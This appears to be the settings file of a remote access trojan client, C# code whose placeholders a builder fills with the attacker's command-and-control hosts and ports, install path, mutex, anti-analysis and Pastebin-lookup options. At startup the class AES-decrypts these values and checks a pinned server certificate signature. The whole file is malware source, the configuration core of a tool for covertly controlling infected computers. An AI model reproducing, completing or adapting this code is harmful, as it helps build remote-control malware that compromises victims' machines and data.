﻿using Client.Algorithm;
using Client.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
    public static class Settings
    {

        public static string Ports = "%Ports%";
        public static string Hosts = "%Hosts%";
        public static string Version = "%Version%";
        public static string Install = "%Install%";
        public static string InstallFolder = "%Folder%";
        public static string InstallFile = "%File%";
        public static string Key = "%Key%";
        public static string MTX = "%MTX%";
        public static string Certificate = "%Certificate%";
        public static string Serversignature = "%Serversignature%";
        public static X509Certificate2 ServerCertificate;
        public static string Anti = "%Anti%";
        public static Aes256 aes256;
        public static string Pastebin = "%Pastebin%";
        public static string BDOS = "%BDOS%";
        public static string Hwid = null;
        public static string Delay = "%Delay%";
        public static string Group = "%Group%";


        public static bool InitializeSettings()
        {
            try
            {
                Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
                aes256 = new Aes256(Key);
                Ports = aes256.Decrypt(Ports);
                Hosts = aes256.Decrypt(Hosts);
                Version = aes256.Decrypt(Version);
                Install = aes256.Decrypt(Install);
                MTX = aes256.Decrypt(MTX);
                Pastebin = aes256.Decrypt(Pastebin);
                Anti = aes256.Decrypt(Anti);
                BDOS = aes256.Decrypt(BDOS);
                Group = aes256.Decrypt(Group);
                Hwid = HwidGen.HWID();
                Serversignature = aes256.Decrypt(Serversignature);
                ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
                return VerifyHash();
            }
            catch { return false; }
        }

        private static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}